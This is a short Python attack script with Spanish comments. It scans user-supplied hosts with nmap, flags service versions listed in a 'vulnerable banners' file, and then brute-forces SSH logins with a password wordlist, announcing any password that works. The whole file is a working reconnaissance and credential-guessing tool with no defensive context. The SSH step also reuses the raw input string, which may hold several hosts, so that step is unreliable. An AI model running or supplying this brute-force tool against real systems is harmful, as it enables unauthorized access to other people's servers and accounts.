import nmap
import paramiko, sys, os, socket, termcolor

def scan(target):
    nm = nmap.PortScanner()
    nm.scan(hosts=target, arguments='-p 20,21,22,25,53,80,110,123,143,179,443,465,500,587,993,995,2222,3389,41648 -sV -sC')  # Escaneo de todos los puertos con detección de versiones
    
    with open('vulbanners.txt', 'r') as file:
        #vul_banners = file.read().splitlines()
        vul_banners = [line.strip() for line in file.readlines()]
    
    for host in nm.all_hosts():
        print('\n' + '[-_0 Scanning target] ' + str(host))
        for proto in nm[host].all_protocols():
            print('Protocolo : %s' % proto)
            ports = nm[host][proto].keys()
            for port in ports:
                product_version = nm[host][proto][port]['product'] + ' ' + nm[host][proto][port]['version']
                print('[+] Puerto abierto ' + str(port) + ' : ' + product_version)
                if product_version in vul_banners:
                    print('[!!] VULNERABLE BANNER: "' + product_version + '" ON PORT: ' + str(port))
                    
targets = input('Escriba el dominio o ips a escanear (separados por coma): ')
if ',' in targets:
    for ip_add in targets.split(','):
        scan(ip_add.strip(' '))
else:
    scan(targets)
    
    

def ssh_connect(password, code=0):

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(targets, port=22, username=username, password=password)

    except paramiko.AuthenticationException:
        code = 1

    except socket.error as e:
        code = 2
 
    ssh.close()
    return code


# host = input('[+] Target Address: ')
username = input('[+] SSH Username: ')
input_file = "passwords.txt"
print('\n')

if os.path.exists(input_file) == False:
    print('[!!] That File/Path Doesnt Exist')
    sys.exit(1)

with open(input_file, 'r') as file:
    for line in file.readlines():
        password = line.strip()
        try:
            response = ssh_connect(password)
            if response == 0:
                print(termcolor.colored(('[+] Found Password: ' + password + ' , For Account: ' + username), 'green'))
                break

            elif response == 1:
                print('[-] Incorrect Login: ' + password)

            elif response == 2:
                print('[!!] Cant Connect')
                sys.exit(1)

        except Exception as e:
            print(e)
            pass